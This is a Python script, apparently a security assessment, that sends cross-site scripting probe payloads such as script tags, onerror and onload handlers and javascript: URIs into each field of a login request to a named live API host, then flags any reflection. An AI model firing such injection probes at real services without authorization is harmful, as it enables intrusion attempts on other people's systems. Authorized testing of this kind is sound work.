
import requests
import time

URL = "https://dsapi.thelocal.co.in/dc/api/v1/auth/login"

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

BASE_PAYLOAD = {
    "email": "securitytest@example.com",
    "password": "InvalidPassword123!",
    "platform": "android",
    "deviceId": "security-test-device"
}

TEST_CASES = [
    {
        "name": "Mixed-case script tag",
        "value": "<ScRiPt>alert(1)</ScRiPt>"
    },
    {
        "name": "Uppercase script tag",
        "value": "<SCRIPT>alert(1)</SCRIPT>"
    },
    {
        "name": "HTML event handler",
        "value": '<div onclick="alert(1)">TEST</div>'
    },
    {
        "name": "SVG event handler",
        "value": '<svg onload="alert(1)">TEST</svg>'
    },
    {
        "name": "Image event handler",
        "value": '<img src="x" onerror="alert(1)">'
    },
    {
        "name": "Encoded script tag",
        "value": "&lt;script&gt;alert(1)&lt;/script&gt;"
    },
    {
        "name": "JavaScript URI",
        "value": "javascript:alert(1)"
    },
    {
        "name": "HTML attribute injection",
        "value": '"><div title="TEST">INJECTION</div>'
    },
    {
        "name": "Nested HTML tag",
        "value": "<<script>alert(1)</script>"
    },
    {
        "name": "Script tag with whitespace",
        "value": "<script >alert(1)</script >"
    }
]

FIELDS = ["email", "password", "platform", "deviceId"]

print("=" * 65)
print("DOCSYNAPSE - SCRIPT INJECTION VARIATION TESTING")
print("=" * 65)

for field in FIELDS:

    print("\nTESTING FIELD:", field)

    for index, test in enumerate(TEST_CASES, 1):

        payload = BASE_PAYLOAD.copy()
        payload[field] = test["value"]

        print(f"\n[{index}/{len(TEST_CASES)}] {test['name']}")

        try:
            start = time.time()

            response = requests.post(
                URL,
                json=payload,
                headers=HEADERS,
                timeout=15
            )

            elapsed = round(time.time() - start, 3)

            print("HTTP Status:", response.status_code)
            print("Response Time:", elapsed)

            body = response.text

            if response.status_code == 429:
                print("RATE LIMITED - STOPPING TESTS")
                raise SystemExit

            if test["value"] in body:
                print("WARNING: EXACT PAYLOAD REFLECTED")
            else:
                print("Payload not directly reflected")

            if response.status_code in (400, 401, 403, 422):
                print("OBSERVATION: Request rejected")

            elif response.status_code >= 500:
                print("WARNING: SERVER ERROR - INVESTIGATE")

            print("Response:", body[:250])

        except requests.exceptions.RequestException as error:
            print("REQUEST ERROR:", error)
            raise SystemExit

        time.sleep(5)

print("\nSCRIPT INJECTION TESTING COMPLETED")
